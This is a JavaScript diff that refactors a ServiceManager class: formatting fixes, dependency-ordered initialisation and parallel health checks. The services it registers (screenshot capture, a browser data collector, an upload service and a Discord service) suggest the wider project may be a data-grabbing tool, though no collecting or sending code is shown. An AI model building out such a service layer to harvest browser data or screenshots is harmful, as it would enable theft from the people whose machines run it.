@@ -72,7 +72,7 @@ class ServiceManager {
         // Register services without dependencies first
         this.register('upload', () => uploadService, []);
         this.register('screenshot', () => new ScreenshotCapture(), []);
-        
+
         // Register services with dependencies
         this.register('discord', () => new DiscordService(), ['upload']);
         this.register('browserCollector', () => new BrowserCollector(), []);
@@ -83,21 +83,23 @@ class ServiceManager {
      * @private
      */
     async _initializeServices() {
-        const initializeService = async (name) => {
+        const initializeService = async name => {
             const serviceDef = this.dependencies.get(name);
             if (!serviceDef || serviceDef.initialized) {
                 return;
             }
 
-            // Initialize dependencies first
+            // Initialize dependencies first (sequentially to maintain order)
+            // eslint-disable-next-line no-await-in-loop
             for (const depName of serviceDef.deps) {
                 await initializeService(depName);
             }
 
             // Create service instance
-            const instance = typeof serviceDef.factory === 'function' 
-                ? serviceDef.factory() 
-                : serviceDef.factory;
+            const instance =
+                typeof serviceDef.factory === 'function'
+                    ? serviceDef.factory()
+                    : serviceDef.factory;
 
             // Initialize service if it has an init method
             if (instance && typeof instance.initialize === 'function') {
@@ -107,7 +109,7 @@ class ServiceManager {
             serviceDef.instance = instance;
             serviceDef.initialized = true;
             this.services.set(name, instance);
-            
+
             logger.debug(`Service '${name}' initialized`);
         };
 
@@ -173,19 +175,26 @@ class ServiceManager {
             services: {}
         };
 
-        for (const [name, service] of this.services) {
+        const healthChecks = Array.from(this.services.entries()).map(async ([name, service]) => {
             try {
                 // Check if service has a health check method
                 if (typeof service.healthCheck === 'function') {
-                    health.services[name] = await service.healthCheck();
+                    return [name, await service.healthCheck()];
                 } else {
-                    health.services[name] = 'healthy';
+                    return [name, 'healthy'];
                 }
             } catch (error) {
-                health.services[name] = `unhealthy: ${error.message}`;
+                return [name, `unhealthy: ${error.message}`];
+            }
+        });
+
+        const results = await Promise.all(healthChecks);
+        results.forEach(([name, status]) => {
+            health.services[name] = status;
+            if (status.includes('unhealthy')) {
                 health.overall = 'degraded';
             }
-        }
+        });
 
         return health;
     }
@@ -199,7 +208,7 @@ class ServiceManager {
 
             // Cleanup services in reverse dependency order
             const cleanupPromises = [];
-            
+
             for (const [name, service] of this.services) {
                 if (service && typeof service.cleanup === 'function') {
                     try {
@@ -207,8 +216,11 @@ class ServiceManager {
                         // Handle both sync and async cleanup functions
                         if (cleanupResult && typeof cleanupResult.then === 'function') {
                             cleanupPromises.push(
-                                cleanupResult.catch(error => 
-                                    logger.warn(`Failed to cleanup service '${name}':`, error.message)
+                                cleanupResult.catch(error =>
+                                    logger.warn(
+                                        `Failed to cleanup service '${name}':`,
+                                        error.message
+                                    )
                                 )
                             );
                         }
@@ -240,7 +252,7 @@ class ServiceManager {
         }
 
         const serviceDef = this.dependencies.get(serviceName);
-        
+
         // Cleanup existing instance
         if (serviceDef.instance && typeof serviceDef.instance.cleanup === 'function') {
             await serviceDef.instance.cleanup();
@@ -252,9 +264,8 @@ class ServiceManager {
         this.services.delete(serviceName);
 
         // Reinitialize
-        const instance = typeof serviceDef.factory === 'function' 
-            ? serviceDef.factory() 
-            : serviceDef.factory;
+        const instance =
+            typeof serviceDef.factory === 'function' ? serviceDef.factory() : serviceDef.factory;
 
         if (instance && typeof instance.initialize === 'function') {
             await instance.initialize();
